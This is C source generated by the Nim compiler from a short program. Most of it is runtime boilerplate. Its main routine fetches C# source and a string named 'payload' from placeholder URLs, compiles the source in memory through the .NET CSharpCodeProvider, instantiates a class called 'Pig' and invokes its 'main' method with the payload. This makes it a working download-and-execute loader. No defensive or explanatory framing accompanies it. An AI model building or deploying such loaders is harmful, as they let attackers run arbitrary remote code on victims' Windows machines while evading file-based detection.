/* Generated by Nim Compiler v1.6.0 */
#define NIM_INTBITS 32

#include "nimbase.h"
#include <string.h>
#undef LANGUAGE_C
#undef MIPSEB
#undef MIPSEL
#undef PPC
#undef R3000
#undef R4000
#undef i386
#undef linux
#undef mips
#undef near
#undef far
#undef powerpc
#undef unix
#define nimfr_(x, y)
#define nimln_(x, y)
typedef struct NimStringDesc NimStringDesc;
typedef struct TGenericSeq TGenericSeq;
typedef struct TNimType TNimType;
typedef struct TNimNode TNimNode;
typedef struct tySequence__wfzhy8RTNYkMytxQXIPT1A tySequence__wfzhy8RTNYkMytxQXIPT1A;
typedef struct tyObject_Header__oFhWnxD33zTQi87OVhvcHw tyObject_Header__oFhWnxD33zTQi87OVhvcHw;
typedef struct tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g;
typedef struct tyObject_CellSeq__Axo1XVm9aaQueTOldv8le5w tyObject_CellSeq__Axo1XVm9aaQueTOldv8le5w;
typedef struct tyObject_GcHeap__1TRH1TZMaVZTnLNcIHuNFQ tyObject_GcHeap__1TRH1TZMaVZTnLNcIHuNFQ;
typedef struct tyObject_GcStack__7fytPA5bBsob6See21YMRA tyObject_GcStack__7fytPA5bBsob6See21YMRA;
typedef struct tyObject_MemRegion__x81NhDv59b8ercDZ9bi85jyg tyObject_MemRegion__x81NhDv59b8ercDZ9bi85jyg;
typedef struct tyObject_SmallChunk__tXn60W2f8h3jgAYdEmy5NQ tyObject_SmallChunk__tXn60W2f8h3jgAYdEmy5NQ;
typedef struct tyObject_BigChunk__Rv9c70Uhp2TytkX7eH78qEg tyObject_BigChunk__Rv9c70Uhp2TytkX7eH78qEg;
typedef struct tyObject_LLChunk__XsENErzHIZV9bhvyJx56wGw tyObject_LLChunk__XsENErzHIZV9bhvyJx56wGw;
typedef struct tyObject_IntSet__EZObFrE3NC9bIb3YMkY9crZA tyObject_IntSet__EZObFrE3NC9bIb3YMkY9crZA;
typedef struct tyObject_Trunk__W0r8S0Y3UGke6T9bIUWnnuw tyObject_Trunk__W0r8S0Y3UGke6T9bIUWnnuw;
typedef struct tyObject_AvlNode__IaqjtwKhxLEpvDS9bct9blEw tyObject_AvlNode__IaqjtwKhxLEpvDS9bct9blEw;
typedef struct tyObject_HeapLinks__PDV1HBZ8CQSQJC9aOBFNRSg tyObject_HeapLinks__PDV1HBZ8CQSQJC9aOBFNRSg;
typedef struct tyTuple__ujsjpB2O9cjj3uDHsXbnSzg tyTuple__ujsjpB2O9cjj3uDHsXbnSzg;
typedef struct tyObject_GcStat__0RwLoVBHZPfUAcLczmfQAg tyObject_GcStat__0RwLoVBHZPfUAcLczmfQAg;
typedef struct tyObject_CellSet__jG87P0AI9aZtss9ccTYBIISQ tyObject_CellSet__jG87P0AI9aZtss9ccTYBIISQ;
typedef struct tyObject_PageDesc__fublkgIY4LG3mT51LU2WHg tyObject_PageDesc__fublkgIY4LG3mT51LU2WHg;
typedef struct tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA;
struct TGenericSeq {
NI len;
NI reserved;
};
struct NimStringDesc {
  TGenericSeq Sup;
NIM_CHAR data[SEQ_DECL_SIZE];
};
typedef NU8 tyEnum_TNimKind__jIBKr1ejBgsfM33Kxw4j7A;
typedef NU8 tySet_tyEnum_TNimTypeFlag__v8QUszD1sWlSIWZz7mC4bQ;
typedef N_NIMCALL_PTR(void, tyProc__ojoeKfW4VYIm36I9cpDTQIg) (void* p, NI op);
typedef N_NIMCALL_PTR(void*, tyProc__WSm2xU5ARYv9aAR4l0z9c9auQ) (void* p);
struct TNimType {
NI size;
NI align;
tyEnum_TNimKind__jIBKr1ejBgsfM33Kxw4j7A kind;
tySet_tyEnum_TNimTypeFlag__v8QUszD1sWlSIWZz7mC4bQ flags;
TNimType* base;
TNimNode* node;
void* finalizer;
tyProc__ojoeKfW4VYIm36I9cpDTQIg marker;
tyProc__WSm2xU5ARYv9aAR4l0z9c9auQ deepcopy;
};
typedef NU8 tyEnum_TNimNodeKind__unfNsxrcATrufDZmpBq4HQ;
struct TNimNode {
tyEnum_TNimNodeKind__unfNsxrcATrufDZmpBq4HQ kind;
NI offset;
TNimType* typ;
NCSTRING name;
NI len;
TNimNode** sons;
};
typedef N_NIMCALL_PTR(void, tyProc__T4eqaYlFJYZUv9aG9b1TV0bQ) (void);
struct tyObject_Header__oFhWnxD33zTQi87OVhvcHw {
NimStringDesc* key;
NimStringDesc* value;
};
struct tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g {
NI refcount;
TNimType* typ;
};
struct tyObject_GcStack__7fytPA5bBsob6See21YMRA {
void* bottom;
};
struct tyObject_CellSeq__Axo1XVm9aaQueTOldv8le5w {
NI len;
NI cap;
tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g** d;
};
typedef tyObject_SmallChunk__tXn60W2f8h3jgAYdEmy5NQ* tyArray__SPr7N6UKfuF549bNPiUvSRw[256];
typedef NU32 tyArray__BHbOSqU1t9b3Gt7K2c6fQig[24];
typedef tyObject_BigChunk__Rv9c70Uhp2TytkX7eH78qEg* tyArray__N1u1nqOgmuJN9cSZrnMHgOQ[32];
typedef tyArray__N1u1nqOgmuJN9cSZrnMHgOQ tyArray__B6durA4ZCi1xjJvRtyYxMg[24];
typedef tyObject_Trunk__W0r8S0Y3UGke6T9bIUWnnuw* tyArray__lh2A89ahMmYg9bCmpVaplLbA[256];
struct tyObject_IntSet__EZObFrE3NC9bIb3YMkY9crZA {
tyArray__lh2A89ahMmYg9bCmpVaplLbA data;
};
typedef tyObject_AvlNode__IaqjtwKhxLEpvDS9bct9blEw* tyArray__0aOLqZchNi8nWtMTi8ND8w[2];
struct tyObject_AvlNode__IaqjtwKhxLEpvDS9bct9blEw {
tyArray__0aOLqZchNi8nWtMTi8ND8w link;
NI key;
NI upperBound;
NI level;
};
struct tyTuple__ujsjpB2O9cjj3uDHsXbnSzg {
tyObject_BigChunk__Rv9c70Uhp2TytkX7eH78qEg* Field0;
NI Field1;
};
typedef tyTuple__ujsjpB2O9cjj3uDHsXbnSzg tyArray__LzOv2eCDGiceMKQstCLmhw[30];
struct tyObject_HeapLinks__PDV1HBZ8CQSQJC9aOBFNRSg {
NI len;
tyArray__LzOv2eCDGiceMKQstCLmhw chunks;
tyObject_HeapLinks__PDV1HBZ8CQSQJC9aOBFNRSg* next;
};
struct tyObject_MemRegion__x81NhDv59b8ercDZ9bi85jyg {
NI minLargeObj;
NI maxLargeObj;
tyArray__SPr7N6UKfuF549bNPiUvSRw freeSmallChunks;
NU32 flBitmap;
tyArray__BHbOSqU1t9b3Gt7K2c6fQig slBitmap;
tyArray__B6durA4ZCi1xjJvRtyYxMg matrix;
tyObject_LLChunk__XsENErzHIZV9bhvyJx56wGw* llmem;
NI currMem;
NI maxMem;
NI freeMem;
NI occ;
NI lastSize;
tyObject_IntSet__EZObFrE3NC9bIb3YMkY9crZA chunkStarts;
tyObject_AvlNode__IaqjtwKhxLEpvDS9bct9blEw* root;
tyObject_AvlNode__IaqjtwKhxLEpvDS9bct9blEw* deleted;
tyObject_AvlNode__IaqjtwKhxLEpvDS9bct9blEw* last;
tyObject_AvlNode__IaqjtwKhxLEpvDS9bct9blEw* freeAvlNodes;
NIM_BOOL locked;
NIM_BOOL blockChunkSizeIncrease;
NI nextChunkSize;
tyObject_AvlNode__IaqjtwKhxLEpvDS9bct9blEw bottomData;
tyObject_HeapLinks__PDV1HBZ8CQSQJC9aOBFNRSg heapLinks;
};
struct tyObject_GcStat__0RwLoVBHZPfUAcLczmfQAg {
NI stackScans;
NI cycleCollections;
NI maxThreshold;
NI maxStackSize;
NI maxStackCells;
NI cycleTableSize;
NI64 maxPause;
};
struct tyObject_CellSet__jG87P0AI9aZtss9ccTYBIISQ {
NI counter;
NI max;
tyObject_PageDesc__fublkgIY4LG3mT51LU2WHg* head;
tyObject_PageDesc__fublkgIY4LG3mT51LU2WHg** data;
};
struct tyObject_GcHeap__1TRH1TZMaVZTnLNcIHuNFQ {
tyObject_GcStack__7fytPA5bBsob6See21YMRA stack;
NI cycleThreshold;
NI zctThreshold;
tyObject_CellSeq__Axo1XVm9aaQueTOldv8le5w zct;
tyObject_CellSeq__Axo1XVm9aaQueTOldv8le5w decStack;
tyObject_CellSeq__Axo1XVm9aaQueTOldv8le5w tempStack;
NI recGcLock;
tyObject_MemRegion__x81NhDv59b8ercDZ9bi85jyg region;
tyObject_GcStat__0RwLoVBHZPfUAcLczmfQAg stat;
tyObject_CellSet__jG87P0AI9aZtss9ccTYBIISQ marked;
tyObject_CellSeq__Axo1XVm9aaQueTOldv8le5w additionalRoots;
NI gcThreadId;
};
typedef NimStringDesc* tyArray__Re75IspeoxXy2oCZHwcRrA[2];
typedef tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA* tyArray__qLf4SyTPtwHFHdRF4RUKhQ[1];
typedef NimStringDesc* tyArray__nHXaesL0DJZHyVS07ARPRA[1];
typedef tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA* tyArray__OWiUC6Si8zoguv9axUwdXLw[1];
struct tySequence__wfzhy8RTNYkMytxQXIPT1A {
  TGenericSeq Sup;
  tyObject_Header__oFhWnxD33zTQi87OVhvcHw data[SEQ_DECL_SIZE];
};
N_LIB_PRIVATE N_NIMCALL(void, nimGCvisit)(void* d, NI op);
static N_NIMCALL(void, TM__V45tF8B8NBcxFcjfe7lhBw_2)(void);
N_LIB_PRIVATE N_NIMCALL(void, nimRegisterGlobalMarker)(tyProc__T4eqaYlFJYZUv9aG9b1TV0bQ markerProc);
N_LIB_PRIVATE N_NIMCALL(NimStringDesc*, fetch_6758Z85sersZxZOnimbleZpkgsZpuppy4549O52O48Zpuppy_337)(NimStringDesc* url, tySequence__wfzhy8RTNYkMytxQXIPT1A* headers);
N_LIB_PRIVATE N_NIMCALL(tySequence__wfzhy8RTNYkMytxQXIPT1A*, newSeq_6758Z85sersZxZOnimbleZpkgsZpuppy4549O52O48Zpuppy_308)(NI len);
static N_INLINE(void, asgnRef)(void** dest, void* src);
static N_INLINE(void, incRef_system_5349)(tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g* c);
static N_INLINE(NI, pluspercent__system_696)(NI x, NI y);
static N_INLINE(tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g*, usrToCell_system_5311)(void* usr);
static N_INLINE(NI, minuspercent__system_716)(NI x, NI y);
static N_INLINE(void, decRef_system_5356)(tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g* c);
static N_INLINE(NIM_BOOL, ltpercent__system_1005)(NI x, NI y);
static N_INLINE(void, rtlAddZCT_system_5354)(tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g* c);
N_LIB_PRIVATE N_NOINLINE(void, addZCT_system_5305)(tyObject_CellSeq__Axo1XVm9aaQueTOldv8le5w* s, tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g* c);
static N_NIMCALL(void, TM__V45tF8B8NBcxFcjfe7lhBw_4)(void);
static N_NIMCALL(void, TM__V45tF8B8NBcxFcjfe7lhBw_6)(void);
N_LIB_PRIVATE N_NIMCALL(tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA*, compile_6758Z85sersZxZOnimbleZpkgsZwinim4551O55O49ZwinimZclr_1910)(NimStringDesc* code, NimStringDesc** references, NI referencesLen_0, NimStringDesc* filename, NimStringDesc* compilerOptions, NimStringDesc* provider, NIM_BOOL debug);
static N_NIMCALL(void, TM__V45tF8B8NBcxFcjfe7lhBw_11)(void);
N_LIB_PRIVATE N_NIMCALL(tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA*, new_6758Z85sersZxZOnimbleZpkgsZwinim4551O55O49ZwinimZclr_1819)(tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA* assembly, NimStringDesc* name, tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA** vargs, NI vargsLen_0);
N_LIB_PRIVATE N_NIMCALL(tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA*, invoke_6758Z85sersZxZOnimbleZpkgsZwinim4551O55O49ZwinimZclr_761)(tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA* v, NimStringDesc* name, NI flags, tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA** vargs, NI vargsLen_0);
static N_INLINE(void, nimZeroMem)(void* p, NI size);
static N_INLINE(void, nimSetMem_systemZmemory_7)(void* a, int v, NI size);
N_LIB_PRIVATE N_NIMCALL(NimStringDesc*, dollar__6758Z85sersZxZOnimbleZpkgsZwinim4551O55O49ZwinimZclr_1137)(tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA* v);
static N_INLINE(tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA*, toCLRVariant_6758Z85sersZxZOnimbleZpkgsZwinim4551O55O49ZwinimZclr_1483)(NimStringDesc* x);
N_LIB_PRIVATE N_NIMCALL(tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA*, toVariant_6758Z85sersZxZOnimbleZpkgsZwinim4551O55O49ZwinimZcom_6615)(NimStringDesc* x);
N_LIB_PRIVATE N_NIMCALL(void, echoBinSafe)(NimStringDesc** args, NI argsLen_0);
static N_INLINE(void, initStackBottomWith)(void* locals);
N_LIB_PRIVATE N_NOINLINE(void, nimGC_setStackBottom)(void* theStackBottom);
N_LIB_PRIVATE N_NIMCALL(void, stdlib_ioDatInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, stdlib_ioInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, systemDatInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, systemInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, stdlib_winleanDatInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, stdlib_winleanInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, stdlib_timesDatInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, stdlib_timesInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, stdlib_osDatInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, stdlib_osInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, stdlib_nativesocketsInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, puppy_commonDatInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, urlly_urllyDatInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, zippy_zippyerrorDatInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, zippy_commonDatInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, zippy_inflateDatInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, puppy_windefsDatInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, puppy_winutilsDatInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, puppy_puppyDatInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, winim_windefDatInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, winim_objbaseDatInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, winim_mscoreeDatInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, winim_winstrDatInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, winim_comDatInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, winim_comInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, winim_clrDatInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, winim_clrInit000)(void);
N_LIB_PRIVATE N_NIMCALL(void, NimMainModule)(void);
extern TNimType NTIstring__77mFvmsOLKik79ci2hXkHEg_;
STRING_LITERAL(TM__V45tF8B8NBcxFcjfe7lhBw_3, "https://x.com/main.cs", 21);
STRING_LITERAL(TM__V45tF8B8NBcxFcjfe7lhBw_5, "https://x/code.txt", 22);
extern TNimType NTIvariant__VYnrN9cMJav8fTNB7Pu9bPZw_;
STRING_LITERAL(TM__V45tF8B8NBcxFcjfe7lhBw_8, "System.dll", 10);
STRING_LITERAL(TM__V45tF8B8NBcxFcjfe7lhBw_9, "System.Windows.Forms.dll", 24);
static NIM_CONST tyArray__Re75IspeoxXy2oCZHwcRrA TM__V45tF8B8NBcxFcjfe7lhBw_7 = {((NimStringDesc*) &TM__V45tF8B8NBcxFcjfe7lhBw_8),
((NimStringDesc*) &TM__V45tF8B8NBcxFcjfe7lhBw_9)}
;
STRING_LITERAL(TM__V45tF8B8NBcxFcjfe7lhBw_10, "Microsoft.CSharp.CSharpCodeProvider", 35);
STRING_LITERAL(TM__V45tF8B8NBcxFcjfe7lhBw_12, "CompiledAssembly", 16);
STRING_LITERAL(TM__V45tF8B8NBcxFcjfe7lhBw_13, "Pig", 3);
STRING_LITERAL(TM__V45tF8B8NBcxFcjfe7lhBw_14, "main", 4);
N_LIB_PRIVATE NimStringDesc* code_main_3;
extern tyObject_GcHeap__1TRH1TZMaVZTnLNcIHuNFQ gch_system_5258;
N_LIB_PRIVATE NimStringDesc* payload_main_4;
N_LIB_PRIVATE tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA* res_main_5;
N_LIB_PRIVATE tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA* foo_main_6;
static N_NIMCALL(void, TM__V45tF8B8NBcxFcjfe7lhBw_2)(void) {
	nimGCvisit((void*)code_main_3, 0);
}
static N_INLINE(NI, pluspercent__system_696)(NI x, NI y) {
	NI result;
	result = (NI)0;
	result = ((NI) ((NU)((NU32)(((NU) (x))) + (NU32)(((NU) (y))))));
	return result;
}
static N_INLINE(void, incRef_system_5349)(tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g* c) {
	(*c).refcount = pluspercent__system_696((*c).refcount, ((NI) 8));
}
static N_INLINE(NI, minuspercent__system_716)(NI x, NI y) {
	NI result;
	result = (NI)0;
	result = ((NI) ((NU)((NU32)(((NU) (x))) - (NU32)(((NU) (y))))));
	return result;
}
static N_INLINE(tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g*, usrToCell_system_5311)(void* usr) {
	tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g* result;
	NI T1_;
	result = (tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g*)0;
	T1_ = (NI)0;
	T1_ = minuspercent__system_716(((NI) (ptrdiff_t) (usr)), ((NI) 8));
	result = ((tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g*) (T1_));
	return result;
}
static N_INLINE(NIM_BOOL, ltpercent__system_1005)(NI x, NI y) {
	NIM_BOOL result;
	result = (NIM_BOOL)0;
	result = ((NU32)(((NU) (x))) < (NU32)(((NU) (y))));
	return result;
}
static N_INLINE(void, rtlAddZCT_system_5354)(tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g* c) {
	addZCT_system_5305((&gch_system_5258.zct), c);
}
static N_INLINE(void, decRef_system_5356)(tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g* c) {
	(*c).refcount = minuspercent__system_716((*c).refcount, ((NI) 8));
	{
		NIM_BOOL T3_;
		T3_ = (NIM_BOOL)0;
		T3_ = ltpercent__system_1005((*c).refcount, ((NI) 8));
		if (!T3_) goto LA4_;
		rtlAddZCT_system_5354(c);
	}
	LA4_: ;
}
static N_INLINE(void, asgnRef)(void** dest, void* src) {
	{
		tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g* T5_;
		if (!!((src == NIM_NIL))) goto LA3_;
		T5_ = (tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g*)0;
		T5_ = usrToCell_system_5311(src);
		incRef_system_5349(T5_);
	}
	LA3_: ;
	{
		tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g* T10_;
		if (!!(((*dest) == NIM_NIL))) goto LA8_;
		T10_ = (tyObject_Cell__1zcF9cV8XIAtbN8h5HRUB8g*)0;
		T10_ = usrToCell_system_5311((*dest));
		decRef_system_5356(T10_);
	}
	LA8_: ;
	(*dest) = src;
}
static N_NIMCALL(void, TM__V45tF8B8NBcxFcjfe7lhBw_4)(void) {
	nimGCvisit((void*)payload_main_4, 0);
}
static N_NIMCALL(void, TM__V45tF8B8NBcxFcjfe7lhBw_6)(void) {
	nimGCvisit((void*)res_main_5, 0);
}
static N_NIMCALL(void, TM__V45tF8B8NBcxFcjfe7lhBw_11)(void) {
	nimGCvisit((void*)foo_main_6, 0);
}
static N_INLINE(void, nimSetMem_systemZmemory_7)(void* a, int v, NI size) {
	void* T1_;
	T1_ = (void*)0;
	T1_ = memset(a, v, ((size_t) (size)));
}
static N_INLINE(void, nimZeroMem)(void* p, NI size) {
	nimSetMem_systemZmemory_7(p, ((int) 0), size);
}
static N_INLINE(tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA*, toCLRVariant_6758Z85sersZxZOnimbleZpkgsZwinim4551O55O49ZwinimZclr_1483)(NimStringDesc* x) {
	tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA* result;
	result = (tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA*)0;
	result = toVariant_6758Z85sersZxZOnimbleZpkgsZwinim4551O55O49ZwinimZcom_6615(x);
	return result;
}
static N_INLINE(void, initStackBottomWith)(void* locals) {
	nimGC_setStackBottom(locals);
}

N_LIB_PRIVATE void PreMainInner(void) {
	stdlib_ioInit000();
	stdlib_winleanInit000();
	stdlib_timesInit000();
	stdlib_osInit000();
	stdlib_nativesocketsInit000();
	winim_comInit000();
	winim_clrInit000();
}

N_LIB_PRIVATE int cmdCount;
N_LIB_PRIVATE char** cmdLine;
N_LIB_PRIVATE char** gEnv;
N_LIB_PRIVATE void PreMain(void) {
	void (*volatile inner)(void);
	inner = PreMainInner;
	stdlib_ioDatInit000();
	systemDatInit000();
	initStackBottomWith((void *)&inner);
	systemInit000();
	stdlib_winleanDatInit000();
	stdlib_timesDatInit000();
	stdlib_osDatInit000();
	puppy_commonDatInit000();
	urlly_urllyDatInit000();
	zippy_zippyerrorDatInit000();
	zippy_commonDatInit000();
	zippy_inflateDatInit000();
	puppy_windefsDatInit000();
	puppy_winutilsDatInit000();
	puppy_puppyDatInit000();
	winim_windefDatInit000();
	winim_objbaseDatInit000();
	winim_mscoreeDatInit000();
	winim_winstrDatInit000();
	winim_comDatInit000();
	winim_clrDatInit000();
	(*inner)();
}

N_LIB_PRIVATE N_CDECL(void, NimMainInner)(void) {
	NimMainModule();
}

N_CDECL(void, NimMain)(void) {
	void (*volatile inner)(void);
	PreMain();
	inner = NimMainInner;
	initStackBottomWith((void *)&inner);
	(*inner)();
}

int main(int argc, char** args, char** env) {
	cmdLine = args;
	cmdCount = argc;
	gEnv = env;
	NimMain();
	return nim_program_result;
}

N_LIB_PRIVATE N_NIMCALL(void, NimMainModule)(void) {
{
	TFrame FR_; FR_.len = 0;

	nimRegisterGlobalMarker(TM__V45tF8B8NBcxFcjfe7lhBw_2);


	nimRegisterGlobalMarker(TM__V45tF8B8NBcxFcjfe7lhBw_4);


	nimRegisterGlobalMarker(TM__V45tF8B8NBcxFcjfe7lhBw_6);


	nimRegisterGlobalMarker(TM__V45tF8B8NBcxFcjfe7lhBw_11);

}/* preInitProc end */
{
	tySequence__wfzhy8RTNYkMytxQXIPT1A* T1_;
	tySequence__wfzhy8RTNYkMytxQXIPT1A* T2_;
	tyArray__qLf4SyTPtwHFHdRF4RUKhQ T3_;
	tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA* T4_;
	tyArray__qLf4SyTPtwHFHdRF4RUKhQ T5_;
	tyArray__nHXaesL0DJZHyVS07ARPRA T6_;
	tyArray__OWiUC6Si8zoguv9axUwdXLw T7_;
	tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA* T8_;
	T1_ = (tySequence__wfzhy8RTNYkMytxQXIPT1A*)0;
	T1_ = newSeq_6758Z85sersZxZOnimbleZpkgsZpuppy4549O52O48Zpuppy_308(((NI) 0));
	asgnRef((void**) (&code_main_3), fetch_6758Z85sersZxZOnimbleZpkgsZpuppy4549O52O48Zpuppy_337(((NimStringDesc*) &TM__V45tF8B8NBcxFcjfe7lhBw_3), T1_));
	T2_ = (tySequence__wfzhy8RTNYkMytxQXIPT1A*)0;
	T2_ = newSeq_6758Z85sersZxZOnimbleZpkgsZpuppy4549O52O48Zpuppy_308(((NI) 0));
	asgnRef((void**) (&payload_main_4), fetch_6758Z85sersZxZOnimbleZpkgsZpuppy4549O52O48Zpuppy_337(((NimStringDesc*) &TM__V45tF8B8NBcxFcjfe7lhBw_5), T2_));
	asgnRef((void**) (&res_main_5), compile_6758Z85sersZxZOnimbleZpkgsZwinim4551O55O49ZwinimZclr_1910(code_main_3, TM__V45tF8B8NBcxFcjfe7lhBw_7, 2, ((NimStringDesc*) NIM_NIL), ((NimStringDesc*) NIM_NIL), ((NimStringDesc*) &TM__V45tF8B8NBcxFcjfe7lhBw_10), NIM_FALSE));
	nimZeroMem((void*)T3_, sizeof(tyArray__qLf4SyTPtwHFHdRF4RUKhQ));
	T4_ = (tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA*)0;
	T4_ = invoke_6758Z85sersZxZOnimbleZpkgsZwinim4551O55O49ZwinimZclr_761(res_main_5, ((NimStringDesc*) &TM__V45tF8B8NBcxFcjfe7lhBw_12), ((NI) 5376), T3_, 0);
	nimZeroMem((void*)T5_, sizeof(tyArray__qLf4SyTPtwHFHdRF4RUKhQ));
	asgnRef((void**) (&foo_main_6), new_6758Z85sersZxZOnimbleZpkgsZwinim4551O55O49ZwinimZclr_1819(T4_, ((NimStringDesc*) &TM__V45tF8B8NBcxFcjfe7lhBw_13), T5_, 0));
	nimZeroMem((void*)T6_, sizeof(tyArray__nHXaesL0DJZHyVS07ARPRA));
	nimZeroMem((void*)T7_, sizeof(tyArray__OWiUC6Si8zoguv9axUwdXLw));
	T7_[0] = toCLRVariant_6758Z85sersZxZOnimbleZpkgsZwinim4551O55O49ZwinimZclr_1483(payload_main_4);
	T8_ = (tyObject_variantcolonObjectType___FBSF3pWyJz9clqwLRXzZTsA*)0;
	T8_ = invoke_6758Z85sersZxZOnimbleZpkgsZwinim4551O55O49ZwinimZclr_761(foo_main_6, ((NimStringDesc*) &TM__V45tF8B8NBcxFcjfe7lhBw_14), ((NI) 5376), T7_, 1);
	T6_[0] = dollar__6758Z85sersZxZOnimbleZpkgsZwinim4551O55O49ZwinimZclr_1137(T8_);
	echoBinSafe(T6_, 1);
}
}

